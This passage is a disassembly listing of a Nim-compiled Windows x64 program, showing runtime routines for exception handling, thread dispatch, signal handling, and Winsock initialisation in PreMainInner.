  405148:	5e                   	pop    %rsi
  405149:	5f                   	pop    %rdi
  40514a:	5d                   	pop    %rbp
  40514b:	41 5c                	pop    %r12
  40514d:	41 5d                	pop    %r13
  40514f:	41 5e                	pop    %r14
  405151:	41 5f                	pop    %r15
  405153:	c3                   	ret

0000000000405154 <reportUnhandledError__na8C8pUZ9cLQWVwk35l5vfw_2>:
  405154:	e9 fa fc ff ff       	jmp    404e53 <reportUnhandledErrorAux__na8C8pUZ9cLQWVwk35l5vfw_3>

0000000000405159 <threadProcWrapDispatch__Mxf9cF7DzrT73i52k5zPHQA_2>:
  405159:	55                   	push   %rbp
  40515a:	53                   	push   %rbx
  40515b:	48 89 e5             	mov    %rsp,%rbp
  40515e:	48 81 ec 48 01 00 00 	sub    $0x148,%rsp
  405165:	48 89 4d 18          	mov    %rcx,0x18(%rbp)
  405169:	e8 32 cb ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.73>
  40516e:	48 89 85 e0 fe ff ff 	mov    %rax,-0x120(%rbp)
  405175:	e8 26 cb ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.73>
  40517a:	48 8d 8d e8 fe ff ff 	lea    -0x118(%rbp),%rcx
  405181:	48 8b 50 20          	mov    0x20(%rax),%rdx
  405185:	48 89 48 20          	mov    %rcx,0x20(%rax)
  405189:	48 83 c1 10          	add    $0x10,%rcx
  40518d:	48 89 95 e8 fe ff ff 	mov    %rdx,-0x118(%rbp)
  405194:	48 89 ea             	mov    %rbp,%rdx
  405197:	e8 c4 32 00 00       	call   408460 <_setjmp>
  40519c:	48 98                	cltq
  40519e:	48 85 c0             	test   %rax,%rax
  4051a1:	48 89 85 f0 fe ff ff 	mov    %rax,-0x110(%rbp)
  4051a8:	75 07                	jne    4051b1 <threadProcWrapDispatch__Mxf9cF7DzrT73i52k5zPHQA_2+0x58>
  4051aa:	48 8b 45 18          	mov    0x18(%rbp),%rax
  4051ae:	ff 50 10             	call   *0x10(%rax)
  4051b1:	e8 87 cb ff ff       	call   401d3d <popSafePoint>
  4051b6:	48 8b 85 e0 fe ff ff 	mov    -0x120(%rbp),%rax
  4051bd:	31 db                	xor    %ebx,%ebx
  4051bf:	48 8b 40 08          	mov    0x8(%rax),%rax
  4051c3:	48 85 c0             	test   %rax,%rax
  4051c6:	74 03                	je     4051cb <threadProcWrapDispatch__Mxf9cF7DzrT73i52k5zPHQA_2+0x72>
  4051c8:	48 8b 18             	mov    (%rax),%rbx
  4051cb:	48 ff cb             	dec    %rbx
  4051ce:	48 85 db             	test   %rbx,%rbx
  4051d1:	79 0c                	jns    4051df <threadProcWrapDispatch__Mxf9cF7DzrT73i52k5zPHQA_2+0x86>
  4051d3:	48 83 bd f0 fe ff ff 	cmpq   $0x0,-0x110(%rbp)
  4051da:	00 
  4051db:	74 59                	je     405236 <threadProcWrapDispatch__Mxf9cF7DzrT73i52k5zPHQA_2+0xdd>
  4051dd:	eb 27                	jmp    405206 <threadProcWrapDispatch__Mxf9cF7DzrT73i52k5zPHQA_2+0xad>
  4051df:	48 8b 95 e0 fe ff ff 	mov    -0x120(%rbp),%rdx
  4051e6:	48 89 d8             	mov    %rbx,%rax
  4051e9:	48 c1 e0 04          	shl    $0x4,%rax
  4051ed:	48 03 42 08          	add    0x8(%rdx),%rax
  4051f1:	48 8b 48 18          	mov    0x18(%rax),%rcx
  4051f5:	48 8b 40 10          	mov    0x10(%rax),%rax
  4051f9:	48 85 c9             	test   %rcx,%rcx
  4051fc:	74 04                	je     405202 <threadProcWrapDispatch__Mxf9cF7DzrT73i52k5zPHQA_2+0xa9>
  4051fe:	ff d0                	call   *%rax
  405200:	eb c9                	jmp    4051cb <threadProcWrapDispatch__Mxf9cF7DzrT73i52k5zPHQA_2+0x72>
  405202:	ff d0                	call   *%rax
  405204:	eb c5                	jmp    4051cb <threadProcWrapDispatch__Mxf9cF7DzrT73i52k5zPHQA_2+0x72>
  405206:	e8 95 ca ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.73>
  40520b:	48 8b 48 20          	mov    0x20(%rax),%rcx
  40520f:	48 85 c9             	test   %rcx,%rcx
  405212:	75 13                	jne    405227 <threadProcWrapDispatch__Mxf9cF7DzrT73i52k5zPHQA_2+0xce>
  405214:	48 8b 48 28          	mov    0x28(%rax),%rcx
  405218:	e8 37 ff ff ff       	call   405154 <reportUnhandledError__na8C8pUZ9cLQWVwk35l5vfw_2>
  40521d:	b9 01 00 00 00       	mov    $0x1,%ecx
  405222:	e8 19 32 00 00       	call   408440 <exit>
  405227:	48 83 c1 10          	add    $0x10,%rcx
  40522b:	ba 01 00 00 00       	mov    $0x1,%edx
  405230:	e8 a1 31 00 00       	call   4083d6 <longjmp>
  405235:	90                   	nop
  405236:	48 81 c4 48 01 00 00 	add    $0x148,%rsp
  40523d:	5b                   	pop    %rbx
  40523e:	5d                   	pop    %rbp
  40523f:	c3                   	ret

0000000000405240 <raiseExceptionAux__na8C8pUZ9cLQWVwk35l5vfw>:
  405240:	57                   	push   %rdi
  405241:	56                   	push   %rsi
  405242:	53                   	push   %rbx
  405243:	48 83 ec 20          	sub    $0x20,%rsp
  405247:	48 89 ce             	mov    %rcx,%rsi
  40524a:	e8 51 ca ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.73>
  40524f:	48 89 c7             	mov    %rax,%rdi
  405252:	48 8b 00             	mov    (%rax),%rax
  405255:	48 85 c0             	test   %rax,%rax
  405258:	75 19                	jne    405273 <raiseExceptionAux__na8C8pUZ9cLQWVwk35l5vfw+0x33>
  40525a:	48 83 7f 20 00       	cmpq   $0x0,0x20(%rdi)
  40525f:	75 23                	jne    405284 <raiseExceptionAux__na8C8pUZ9cLQWVwk35l5vfw+0x44>
  405261:	48 89 f1             	mov    %rsi,%rcx
  405264:	e8 eb fe ff ff       	call   405154 <reportUnhandledError__na8C8pUZ9cLQWVwk35l5vfw_2>
  405269:	b9 01 00 00 00       	mov    $0x1,%ecx
  40526e:	e8 cd 31 00 00       	call   408440 <exit>
  405273:	48 89 f1             	mov    %rsi,%rcx
  405276:	ff d0                	call   *%rax
  405278:	84 c0                	test   %al,%al
  40527a:	75 de                	jne    40525a <raiseExceptionAux__na8C8pUZ9cLQWVwk35l5vfw+0x1a>
  40527c:	48 83 c4 20          	add    $0x20,%rsp
  405280:	5b                   	pop    %rbx
  405281:	5e                   	pop    %rsi
  405282:	5f                   	pop    %rdi
  405283:	c3                   	ret
  405284:	e8 17 ca ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.73>
  405289:	48 8d 4e 28          	lea    0x28(%rsi),%rcx
  40528d:	48 8b 50 28          	mov    0x28(%rax),%rdx
  405291:	48 89 c3             	mov    %rax,%rbx
  405294:	e8 67 dc ff ff       	call   402f00 <asgnRef.lto_priv.64>
  405299:	48 8d 4b 28          	lea    0x28(%rbx),%rcx
  40529d:	48 89 f2             	mov    %rsi,%rdx
  4052a0:	e8 1d dc ff ff       	call   402ec2 <unsureAsgnRef>
  4052a5:	48 8b 4f 20          	mov    0x20(%rdi),%rcx
  4052a9:	ba 01 00 00 00       	mov    $0x1,%edx
  4052ae:	48 83 c1 10          	add    $0x10,%rcx
  4052b2:	e8 1f 31 00 00       	call   4083d6 <longjmp>
  4052b7:	90                   	nop

00000000004052b8 <raiseExceptionEx>:
  4052b8:	57                   	push   %rdi
  4052b9:	56                   	push   %rsi
  4052ba:	53                   	push   %rbx
  4052bb:	48 83 ec 40          	sub    $0x40,%rsp
  4052bf:	48 83 79 10 00       	cmpq   $0x0,0x10(%rcx)
  4052c4:	48 89 cb             	mov    %rcx,%rbx
  4052c7:	75 04                	jne    4052cd <raiseExceptionEx+0x15>
  4052c9:	48 89 51 10          	mov    %rdx,0x10(%rcx)
  4052cd:	48 8d 74 24 28       	lea    0x28(%rsp),%rsi
  4052d2:	ba 18 00 00 00       	mov    $0x18,%edx
  4052d7:	4c 89 44 24 70       	mov    %r8,0x70(%rsp)
  4052dc:	48 89 f1             	mov    %rsi,%rcx
  4052df:	e8 de c6 ff ff       	call   4019c2 <nimZeroMem.lto_priv.58>
  4052e4:	48 8b 4b 20          	mov    0x20(%rbx),%rcx
  4052e8:	48 8d 15 11 03 02 00 	lea    0x20311(%rip),%rdx        # 425600 <NTI__uB9b75OUPRENsBAu4AnoePA_>
  4052ef:	4c 8b 44 24 70       	mov    0x70(%rsp),%r8
  4052f4:	4c 89 4c 24 38       	mov    %r9,0x38(%rsp)
  4052f9:	48 8b 84 24 80 00 00 	mov    0x80(%rsp),%rax
  405300:	00 
  405301:	4c 89 44 24 28       	mov    %r8,0x28(%rsp)
  405306:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
  40530b:	e8 af 0b 00 00       	call   405ebf <incrSeqV3>
  405310:	48 8d 4b 20          	lea    0x20(%rbx),%rcx
  405314:	48 89 c2             	mov    %rax,%rdx
  405317:	e8 e4 db ff ff       	call   402f00 <asgnRef.lto_priv.64>
  40531c:	48 8b 53 20          	mov    0x20(%rbx),%rdx
  405320:	48 8b 02             	mov    (%rdx),%rax
  405323:	48 8d 48 01          	lea    0x1(%rax),%rcx
  405327:	48 6b c0 18          	imul   $0x18,%rax,%rax
  40532b:	48 89 0a             	mov    %rcx,(%rdx)
  40532e:	b9 06 00 00 00       	mov    $0x6,%ecx
  405333:	48 8d 44 02 10       	lea    0x10(%rdx,%rax,1),%rax
  405338:	48 89 c7             	mov    %rax,%rdi
  40533b:	f3 a5                	rep movsl (%rsi),(%rdi)
  40533d:	48 89 d9             	mov    %rbx,%rcx
  405340:	e8 fb fe ff ff       	call   405240 <raiseExceptionAux__na8C8pUZ9cLQWVwk35l5vfw>
  405345:	90                   	nop
  405346:	48 83 c4 40          	add    $0x40,%rsp
  40534a:	5b                   	pop    %rbx
  40534b:	5e                   	pop    %rsi
  40534c:	5f                   	pop    %rdi
  40534d:	c3                   	ret

000000000040534e <raiseEIO__ZYk14k3sVNZUIjJjtqzFZQ.constprop.39>:
  40534e:	56                   	push   %rsi
  40534f:	53                   	push   %rbx
  405350:	48 83 ec 38          	sub    $0x38,%rsp
  405354:	48 8d 0d a5 8e 02 00 	lea    0x28ea5(%rip),%rcx        # 42e200 <NTI__HMIVdYjdZYWskTmTQVo5BQ_>
  40535b:	ba 30 00 00 00       	mov    $0x30,%edx
  405360:	e8 81 e9 ff ff       	call   403ce6 <newObj>
  405365:	48 8d 0d 14 c6 00 00 	lea    0xc614(%rip),%rcx        # 411980 <TM__MnCJ0VAmeZ9aTATUB39cx60Q_10>
  40536c:	48 89 c3             	mov    %rax,%rbx
  40536f:	48 8b 73 18          	mov    0x18(%rbx),%rsi
  405373:	48 8d 05 46 8e 02 00 	lea    0x28e46(%rip),%rax        # 42e1c0 <NTI__iLZrPn9anoh9ad1MmO0RczFw_>
  40537a:	48 89 03             	mov    %rax,(%rbx)
  40537d:	48 8d 05 7b 6d 00 00 	lea    0x6d7b(%rip),%rax        # 40c0ff <.rdata+0xff>
  405384:	48 89 43 10          	mov    %rax,0x10(%rbx)
  405388:	e8 b3 e8 ff ff       	call   403c40 <copyStringRC1>
  40538d:	48 85 f6             	test   %rsi,%rsi
  405390:	48 89 43 18          	mov    %rax,0x18(%rbx)
  405394:	74 08                	je     40539e <raiseEIO__ZYk14k3sVNZUIjJjtqzFZQ.constprop.39+0x50>
  405396:	48 89 f1             	mov    %rsi,%rcx
  405399:	e8 93 db ff ff       	call   402f31 <nimGCunrefNoCycle.lto_priv.79>
  40539e:	48 8d 4b 08          	lea    0x8(%rbx),%rcx
  4053a2:	31 d2                	xor    %edx,%edx
  4053a4:	e8 57 db ff ff       	call   402f00 <asgnRef.lto_priv.64>
  4053a9:	4c 8d 0d 57 6d 00 00 	lea    0x6d57(%rip),%r9        # 40c107 <.rdata+0x107>
  4053b0:	48 89 d9             	mov    %rbx,%rcx
  4053b3:	48 c7 44 24 20 8a 00 	movq   $0x8a,0x20(%rsp)
  4053ba:	00 00 
  4053bc:	4c 8d 05 4b 6d 00 00 	lea    0x6d4b(%rip),%r8        # 40c10e <.rdata+0x10e>
  4053c3:	48 8d 15 35 6d 00 00 	lea    0x6d35(%rip),%rdx        # 40c0ff <.rdata+0xff>
  4053ca:	e8 e9 fe ff ff       	call   4052b8 <raiseExceptionEx>
  4053cf:	90                   	nop

00000000004053d0 <raiseOSError__CWyPYlyH9a6rAuZckFyVxPA>:
  4053d0:	48 83 ec 38          	sub    $0x38,%rsp
  4053d4:	e8 da f8 ff ff       	call   404cb3 <newOSError__JXEuze9ctNbkn51HYBflQLg>
  4053d9:	4c 8d 0d 37 6d 00 00 	lea    0x6d37(%rip),%r9        # 40c117 <.rdata+0x117>
  4053e0:	48 c7 44 24 20 5e 00 	movq   $0x5e,0x20(%rsp)
  4053e7:	00 00 
  4053e9:	4c 8d 05 31 6d 00 00 	lea    0x6d31(%rip),%r8        # 40c121 <.rdata+0x121>
  4053f0:	48 89 c1             	mov    %rax,%rcx
  4053f3:	48 8d 15 e0 6c 00 00 	lea    0x6ce0(%rip),%rdx        # 40c0da <.rdata+0xda>
  4053fa:	e8 b9 fe ff ff       	call   4052b8 <raiseExceptionEx>
  4053ff:	90                   	nop
  405400:	48 83 c4 38          	add    $0x38,%rsp
  405404:	c3                   	ret

0000000000405405 <PreMainInner>:
  405405:	57                   	push   %rdi
  405406:	56                   	push   %rsi
  405407:	53                   	push   %rbx
  405408:	48 83 ec 30          	sub    $0x30,%rsp
  40540c:	48 8d 0d ed fb 01 00 	lea    0x1fbed(%rip),%rcx        # 425000 <echoLock__N6SWfXRvlztVlLUFTGu6OQ>
  405413:	ff 15 9b 2e 04 00    	call   *0x42e9b(%rip)        # 4482b4 <__imp_InitializeCriticalSection>
  405419:	31 c9                	xor    %ecx,%ecx
  40541b:	48 8b 3d de 5c 00 00 	mov    0x5cde(%rip),%rdi        # 40b100 <__imp___acrt_iob_func>
  405422:	ff d7                	call   *%rdi
  405424:	48 8b 35 89 2f 04 00 	mov    0x42f89(%rip),%rsi        # 4483b4 <__imp__fileno>
  40542b:	48 89 c1             	mov    %rax,%rcx
  40542e:	ff d6                	call   *%rsi
  405430:	ba 00 80 00 00       	mov    $0x8000,%edx
  405435:	48 8b 1d a0 2f 04 00 	mov    0x42fa0(%rip),%rbx        # 4483dc <__imp__setmode>
  40543c:	89 c1                	mov    %eax,%ecx
  40543e:	ff d3                	call   *%rbx
  405440:	b9 01 00 00 00       	mov    $0x1,%ecx
  405445:	ff d7                	call   *%rdi
  405447:	48 89 c1             	mov    %rax,%rcx
  40544a:	ff d6                	call   *%rsi
  40544c:	ba 00 80 00 00       	mov    $0x8000,%edx
  405451:	89 c1                	mov    %eax,%ecx
  405453:	ff d3                	call   *%rbx
  405455:	b9 02 00 00 00       	mov    $0x2,%ecx
  40545a:	ff d7                	call   *%rdi
  40545c:	48 89 c1             	mov    %rax,%rcx
  40545f:	ff d6                	call   *%rsi
  405461:	ba 00 80 00 00       	mov    $0x8000,%edx
  405466:	89 c1                	mov    %eax,%ecx
  405468:	ff d3                	call   *%rbx
  40546a:	b9 e9 fd 00 00       	mov    $0xfde9,%ecx
  40546f:	ff 15 6b fc 01 00    	call   *0x1fc6b(%rip)        # 4250e0 <Dl_4756003_>
  405475:	b9 e9 fd 00 00       	mov    $0xfde9,%ecx
  40547a:	ff 15 58 fc 01 00    	call   *0x1fc58(%rip)        # 4250d8 <Dl_4756006_>
  405480:	48 8d 0d 09 c3 00 00 	lea    0xc309(%rip),%rcx        # 411790 <TM__k6kyf4Co79a84IkK9blFuQVA_2+0x10>
  405487:	ff 15 37 2e 04 00    	call   *0x42e37(%rip)        # 4482c4 <__imp_LoadLibraryA>
  40548d:	48 85 c0             	test   %rax,%rax
  405490:	74 10                	je     4054a2 <PreMainInner+0x9d>
  405492:	48 8d 15 95 6c 00 00 	lea    0x6c95(%rip),%rdx        # 40c12e <.rdata+0x12e>
  405499:	48 89 c1             	mov    %rax,%rcx
  40549c:	ff 15 f2 2d 04 00    	call   *0x42df2(%rip)        # 448294 <__imp_GetProcAddress>
  4054a2:	48 8d 0d 39 e0 ff ff 	lea    -0x1fc7(%rip),%rcx        # 4034e2 <TM__6NbDwwj5FY059b1gz2AsAZQ_4>
  4054a9:	e8 5a cb ff ff       	call   402008 <nimRegisterThreadLocalMarker>
  4054ae:	48 8d 0d 12 e0 ff ff 	lea    -0x1fee(%rip),%rcx        # 4034c7 <TM__6NbDwwj5FY059b1gz2AsAZQ_5>
  4054b5:	e8 4e cb ff ff       	call   402008 <nimRegisterThreadLocalMarker>
  4054ba:	48 8d 0d b9 df ff ff 	lea    -0x2047(%rip),%rcx        # 40347a <TM__yu6cxgKBBXbNsTkT9cyMd4g_2>
  4054c1:	e8 42 cb ff ff       	call   402008 <nimRegisterThreadLocalMarker>
  4054c6:	48 8d 0d 92 df ff ff 	lea    -0x206e(%rip),%rcx        # 40345f <TM__yu6cxgKBBXbNsTkT9cyMd4g_3>
  4054cd:	e8 36 cb ff ff       	call   402008 <nimRegisterThreadLocalMarker>
  4054d2:	e8 c9 c7 ff ff       	call   401ca0 <GetThreadLocalVars.lto_priv.73>
  4054d7:	48 8d 0d 2d df ff ff 	lea    -0x20d3(%rip),%rcx        # 40340b <TM__vnqLhdH9cCREQ2r9aXVOqbvQ_3>
  4054de:	e8 25 cb ff ff       	call   402008 <nimRegisterThreadLocalMarker>
  4054e3:	48 8d 15 76 c6 01 00 	lea    0x1c676(%rip),%rdx        # 421b60 <wsa__ClAT9bhT9cqG9adztamb5X9b2w>
  4054ea:	b9 01 01 00 00       	mov    $0x101,%ecx
  4054ef:	ff 15 53 47 02 00    	call   *0x24753(%rip)        # 429c48 <Dl_14038442_>
  4054f5:	85 c0                	test   %eax,%eax
  4054f7:	74 0e                	je     405507 <PreMainInner+0x102>
  4054f9:	e8 d8 c0 ff ff       	call   4015d6 <osLastError__9bUWNxbcGnToMWA9b79aTXLIw>
  4054fe:	31 d2                	xor    %edx,%edx
  405500:	89 c1                	mov    %eax,%ecx
  405502:	e8 c9 fe ff ff       	call   4053d0 <raiseOSError__CWyPYlyH9a6rAuZckFyVxPA>
  405507:	48 8d 0d 49 de ff ff 	lea    -0x21b7(%rip),%rcx        # 403357 <TM__gfe9a52b5gJr8GSrnr883iA_5>
  40550e:	e8 f5 ca ff ff       	call   402008 <nimRegisterThreadLocalMarker>
  405513:	41 b8 06 00 00 00    	mov    $0x6,%r8d
  405519:	ba 01 00 00 00       	mov    $0x1,%edx
  40551e:	b9 02 00 00 00       	mov    $0x2,%ecx
  405523:	ff 15 f7 46 02 00    	call   *0x246f7(%rip)        # 429c20 <Dl_14038260_>
  405529:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
  40552d:	48 89 c3             	mov    %rax,%rbx
  405530:	75 0e                	jne    405540 <PreMainInner+0x13b>
  405532:	e8 9f c0 ff ff       	call   4015d6 <osLastError__9bUWNxbcGnToMWA9b79aTXLIw>
  405537:	31 d2                	xor    %edx,%edx
  405539:	89 c1                	mov    %eax,%ecx
  40553b:	e8 90 fe ff ff       	call   4053d0 <raiseOSError__CWyPYlyH9a6rAuZckFyVxPA>
  405540:	48 8d 74 24 28       	lea    0x28(%rsp),%rsi
  405545:	48 89 d9             	mov    %rbx,%rcx
  405548:	48 c7 44 24 28 00 00 	movq   $0x0,0x28(%rsp)
  40554f:	00 00 
  405551:	4c 8d 05 28 5b 00 00 	lea    0x5b28(%rip),%r8        # 40b080 <WSAID_CONNECTEX__YmR9c9crObjjK9ckt1ygsPQKg>
  405558:	48 89 f2             	mov    %rsi,%rdx
  40555b:	e8 1d c0 ff ff       	call   40157d <initPointer__rrU5asl0oI3yYPDxkwgTZg>
  405560:	84 c0                	test   %al,%al
  405562:	75 0e                	jne    405572 <PreMainInner+0x16d>
  405564:	e8 6d c0 ff ff       	call   4015d6 <osLastError__9bUWNxbcGnToMWA9b79aTXLIw>
  405569:	31 d2                	xor    %edx,%edx
  40556b:	89 c1                	mov    %eax,%ecx
  40556d:	e8 5e fe ff ff       	call   4053d0 <raiseOSError__CWyPYlyH9a6rAuZckFyVxPA>
  405572:	4c 8d 05 f7 5a 00 00 	lea    0x5af7(%rip),%r8        # 40b070 <WSAID_ACCEPTEX__pwoOiDuyZgHBOLaI2GSBpg>
  405579:	48 89 f2             	mov    %rsi,%rdx
  40557c:	48 89 d9             	mov    %rbx,%rcx
  40557f:	e8 f9 bf ff ff       	call   40157d <initPointer__rrU5asl0oI3yYPDxkwgTZg>
  405584:	84 c0                	test   %al,%al
  405586:	75 0e                	jne    405596 <PreMainInner+0x191>
  405588:	e8 49 c0 ff ff       	call   4015d6 <osLastError__9bUWNxbcGnToMWA9b79aTXLIw>
  40558d:	31 d2                	xor    %edx,%edx
  40558f:	89 c1                	mov    %eax,%ecx
  405591:	e8 3a fe ff ff       	call   4053d0 <raiseOSError__CWyPYlyH9a6rAuZckFyVxPA>
  405596:	4c 8d 05 c3 5a 00 00 	lea    0x5ac3(%rip),%r8        # 40b060 <WSAID_GETACCEPTEXSOCKADDRS__rSjtFMq7pCHQR2EQvcKbDg>
  40559d:	48 89 f2             	mov    %rsi,%rdx
  4055a0:	48 89 d9             	mov    %rbx,%rcx
  4055a3:	e8 d5 bf ff ff       	call   40157d <initPointer__rrU5asl0oI3yYPDxkwgTZg>
  4055a8:	84 c0                	test   %al,%al
  4055aa:	75 0e                	jne    4055ba <PreMainInner+0x1b5>
  4055ac:	e8 25 c0 ff ff       	call   4015d6 <osLastError__9bUWNxbcGnToMWA9b79aTXLIw>
  4055b1:	31 d2                	xor    %edx,%edx
  4055b3:	89 c1                	mov    %eax,%ecx
  4055b5:	e8 16 fe ff ff       	call   4053d0 <raiseOSError__CWyPYlyH9a6rAuZckFyVxPA>
  4055ba:	48 89 d9             	mov    %rbx,%rcx
  4055bd:	ff 15 4d 46 02 00    	call   *0x2464d(%rip)        # 429c10 <Dl_14038265_>
  4055c3:	90                   	nop
  4055c4:	48 83 c4 30          	add    $0x30,%rsp
  4055c8:	5b                   	pop    %rbx
  4055c9:	5e                   	pop    %rsi
  4055ca:	5f                   	pop    %rdi
  4055cb:	c3                   	ret

00000000004055cc <showErrorMessage__zsORN9crdKxsL9cHrQcdHSMw>:
  4055cc:	53                   	push   %rbx
  4055cd:	48 81 ec 50 01 00 00 	sub    $0x150,%rsp
  4055d4:	c6 44 24 3f 01       	movb   $0x1,0x3f(%rsp)
  4055d9:	8a 44 24 3f          	mov    0x3f(%rsp),%al
  4055dd:	48 89 cb             	mov    %rcx,%rbx
  4055e0:	84 c0                	test   %al,%al
  4055e2:	74 17                	je     4055fb <showErrorMessage__zsORN9crdKxsL9cHrQcdHSMw+0x2f>
  4055e4:	b9 02 00 00 00       	mov    $0x2,%ecx
  4055e9:	ff 15 11 5b 00 00    	call   *0x5b11(%rip)        # 40b100 <__imp___acrt_iob_func>
  4055ef:	48 89 da             	mov    %rbx,%rdx
  4055f2:	48 89 c1             	mov    %rax,%rcx
  4055f5:	e8 dd c7 ff ff       	call   401dd7 <rawWrite>
  4055fa:	90                   	nop
  4055fb:	48 81 c4 50 01 00 00 	add    $0x150,%rsp
  405602:	5b                   	pop    %rbx
  405603:	c3                   	ret

0000000000405604 <signalHandler>:
  405604:	48 83 ec 28          	sub    $0x28,%rsp
  405608:	48 8d 05 74 6b 00 00 	lea    0x6b74(%rip),%rax        # 40c183 <.rdata+0x183>
  40560f:	83 f9 02             	cmp    $0x2,%ecx
  405612:	74 39                	je     40564d <signalHandler+0x49>
  405614:	48 8d 05 88 6b 00 00 	lea    0x6b88(%rip),%rax        # 40c1a3 <.rdata+0x1a3>
  40561b:	83 f9 0b             	cmp    $0xb,%ecx
  40561e:	74 2d                	je     40564d <signalHandler+0x49>
  405620:	48 8d 05 ba 6b 00 00 	lea    0x6bba(%rip),%rax        # 40c1e1 <.rdata+0x1e1>
  405627:	83 f9 16             	cmp    $0x16,%ecx
  40562a:	74 21                	je     40564d <signalHandler+0x49>
  40562c:	48 8d 05 25 6b 00 00 	lea    0x6b25(%rip),%rax        # 40c158 <.rdata+0x158>
  405633:	83 f9 08             	cmp    $0x8,%ecx
  405636:	74 15                	je     40564d <signalHandler+0x49>
  405638:	48 8d 05 34 6b 00 00 	lea    0x6b34(%rip),%rax        # 40c173 <.rdata+0x173>
  40563f:	83 f9 04             	cmp    $0x4,%ecx
  405642:	48 8d 0d b8 6b 00 00 	lea    0x6bb8(%rip),%rcx        # 40c201 <.rdata+0x201>
  405649:	48 0f 44 c1          	cmove  %rcx,%rax
  40564d:	48 89 c1             	mov    %rax,%rcx
  405650:	e8 77 ff ff ff       	call   4055cc <showErrorMessage__zsORN9crdKxsL9cHrQcdHSMw>
  405655:	b9 01 00 00 00       	mov    $0x1,%ecx
  40565a:	e8 e1 2d 00 00       	call   408440 <exit>
  40565f:	90                   	nop

0000000000405660 <raiseOverflow>:
  405660:	56                   	push   %rsi
  405661:	53                   	push   %rbx
  405662:	48 83 ec 38          	sub    $0x38,%rsp
  405666:	48 8d 0d 13 fe 01 00 	lea    0x1fe13(%rip),%rcx        # 425480 <NTI__Pjt0MQjoA6TAHAHOFNel9cg_>
  40566d:	ba 30 00 00 00       	mov    $0x30,%edx
  405672:	e8 6f e6 ff ff       	call   403ce6 <newObj>
  405677:	48 8d 0d a2 b9 00 00 	lea    0xb9a2(%rip),%rcx        # 411020 <TM__Q5wkpxktOdTGvlSRo9bzt9aw_9>
  40567e:	48 89 c3             	mov    %rax,%rbx
  405681:	48 8b 73 18          	mov    0x18(%rbx),%rsi
  405685:	48 8d 05 34 fe 01 00 	lea    0x1fe34(%rip),%rax        # 4254c0 <NTI__Ss6DFlX5iSZpHRZDmP74bg_>
  40568c:	48 89 03             	mov    %rax,(%rbx)
  40568f:	48 8d 05 87 6b 00 00 	lea    0x6b87(%rip),%rax        # 40c21d <.rdata+0x21d>
  405696:	48 89 43 10          	mov    %rax,0x10(%rbx)
  40569a:	e8 a1 e5 ff ff       	call   403c40 <copyStringRC1>
  40569f:	48 85 f6             	test   %rsi,%rsi
  4056a2:	48 89 43 18          	mov    %rax,0x18(%rbx)
  4056a6:	74 08                	je     4056b0 <raiseOverflow+0x50>
  4056a8:	48 89 f1             	mov    %rsi,%rcx
  4056ab:	e8 81 d8 ff ff       	call   402f31 <nimGCunrefNoCycle.lto_priv.79>
  4056b0:	48 c7 44 24 20 31 00 	movq   $0x31,0x20(%rsp)
  4056b7:	00 00 
  4056b9:	4c 8d 0d 85 6a 00 00 	lea    0x6a85(%rip),%r9        # 40c145 <.rdata+0x145>
  4056c0:	48 89 d9             	mov    %rbx,%rcx
  4056c3:	4c 8d 05 85 6a 00 00 	lea    0x6a85(%rip),%r8        # 40c14f <.rdata+0x14f>
  4056ca:	48 8d 15 4c 6b 00 00 	lea    0x6b4c(%rip),%rdx        # 40c21d <.rdata+0x21d>
  4056d1:	e8 e2 fb ff ff       	call   4052b8 <raiseExceptionEx>
  4056d6:	90                   	nop

00000000004056d7 <newSeq>:
  4056d7:	53                   	push   %rbx
  4056d8:	48 83 ec 20          	sub    $0x20,%rsp
  4056dc:	48 8b 41 10          	mov    0x10(%rcx),%rax
  4056e0:	48 89 d3             	mov    %rdx,%rbx
  4056e3:	48 0f af 10          	imul   (%rax),%rdx
  4056e7:	70 06                	jo     4056ef <newSeq+0x18>
  4056e9:	48 83 c2 10          	add    $0x10,%rdx
  4056ed:	71 05                	jno    4056f4 <newSeq+0x1d>
  4056ef:	e8 6c ff ff ff       	call   405660 <raiseOverflow>
  4056f4:	e8 ed e5 ff ff       	call   403ce6 <newObj>
  4056f9:	48 89 18             	mov    %rbx,(%rax)
  4056fc:	48 89 58 08          	mov    %rbx,0x8(%rax)
  405700:	48 83 c4 20          	add    $0x20,%rsp
  405704:	5b                   	pop    %rbx
  405705:	c3                   	ret

0000000000405706 <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.22>:
  405706:	41 57                	push   %r15
  405708:	41 56                	push   %r14
  40570a:	41 55                	push   %r13
  40570c:	41 54                	push   %r12
  40570e:	55                   	push   %rbp
  40570f:	57                   	push   %rdi
  405710:	56                   	push   %rsi
  405711:	53                   	push   %rbx
  405712:	48 83 ec 28          	sub    $0x28,%rsp
  405716:	41 8a 40 08          	mov    0x8(%r8),%al
  40571a:	3c 12                	cmp    $0x12,%al
  40571c:	48 89 cb             	mov    %rcx,%rbx
  40571f:	48 89 d6             	mov    %rdx,%rsi
  405722:	4c 89 c5             	mov    %r8,%rbp
  405725:	44 89 cf             	mov    %r9d,%edi
  405728:	45 0f b6 e1          	movzbl %r9b,%r12d
  40572c:	0f 84 ed 01 00 00    	je     40591f <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.22+0x219>
  405732:	77 1b                	ja     40574f <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.22+0x49>
  405734:	3c 10                	cmp    $0x10,%al
  405736:	0f 84 06 02 00 00    	je     405942 <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.22+0x23c>
  40573c:	0f 87 bb 01 00 00    	ja     4058fd <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.22+0x1f7>
  405742:	3c 04                	cmp    $0x4,%al
  405744:	0f 84 f8 01 00 00    	je     405942 <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.22+0x23c>
  40574a:	e9 6e 02 00 00       	jmp    4059bd <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.22+0x2b7>
  40574f:	3c 18                	cmp    $0x18,%al
  405751:	0f 84 83 00 00 00    	je     4057da <storeAux__T0nmMeLw6EbjZRKdK4QQWA.constprop.22+0xd4>
  405757:	3c 1c                	cmp    $0x1c,%al
